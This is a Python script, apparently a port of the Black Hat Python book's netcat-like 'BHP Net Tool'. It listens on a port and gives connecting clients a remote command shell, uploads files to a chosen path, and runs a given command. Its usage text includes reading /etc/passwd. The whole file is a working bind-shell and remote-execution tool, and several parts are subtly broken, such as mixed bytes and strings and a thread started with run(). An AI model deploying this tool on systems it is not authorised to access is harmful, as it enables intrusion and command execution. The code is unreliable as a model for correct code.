# Black Hat Python

import sys
import socket
import getopt
import threading
import subprocess

# options
listen = False
command = False
upload = False

# parameters
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port ")
    print("\t-l --listen \t\t\t\t - listen on [host]:[port] for incoming connections")
    print("\t-e --execute=file_to_run \t - execute the given file upon receiving a connection")
    print("\t-c --command \t\t\t\t - initialize a command shell")
    print("\t-u --upload=destination \t - upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("\techo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.0.1 -p 135")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    # get options array, ignore filename
    if not len(sys.argv[1:]):
        # if no option, then show usage
        usage()
    try:
        # -op = -o p
        # --option=file1 no apace around =
        opts, args = getopt.getopt(
            # ignore filename
            sys.argv[1:],
            # short option: h/l/c mean switch options; e/t/p/u need parameters behind
            "hle:t:p:cu:",
            # = means option need parameter
            ["help", "listen", "execute=", "target=", "port=", "command", "upload="]
        )
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # parse options
    for o, p in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = p
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = p
        elif o in ("-t", "--target"):
            target = p
        elif o in ("-p", "--port"):
            port = p
        else:
            assert False, "Unhandled Option"

    # url is correct and not listen
    if not listen and len(target) and int(port) > 0:
        # get input string from console
        buffer = sys.stdin.read()

        # send data
        client_sender(buffer)

    if listen:
        server_loop()

# ⚠: encode/decode in socket send/recv
def client_sender(buffer):
    # create a tcp connection
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect
        client.connect((target, int(port)))
        # send data
        if len(buffer):
            client.send(buffer.encode())

        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode()
                # is end of data
                if recv_len < 4096:
                    break

            print(response)

            # waiting input
            # buffer = raw_input("")
            # python3 cancled raw_input()
            buffer = input("input:")
            buffer += "\n"
            client.send(buffer.rstrip().encode())
    except ConnectionError as err:
        print("[*] Exception! Exiting!")
        client.close()


def server_loop():
    global target

    # if target not defined,then target = "0.0.0.0"
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, int(port)))

    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # init a new Thread
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.run()
    return


# run command
def run_command(command):
    # next line
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n".encode()
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(b"Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send(b"Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output.encode())

    if command:
        while True:
            client_socket.send(b"<BHP:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                data = client_socket.recv(1024)
                # bytes decode() to string
                cmd_buffer += data.decode()
                if len(data) < 1024:
                    break

            response = run_command(cmd_buffer)
            client_socket.send(response)


# debug with options:
#     Run -> Edit Configurations -> Choose your file -> input Parameters
#
# function must be defined firstlly
main()
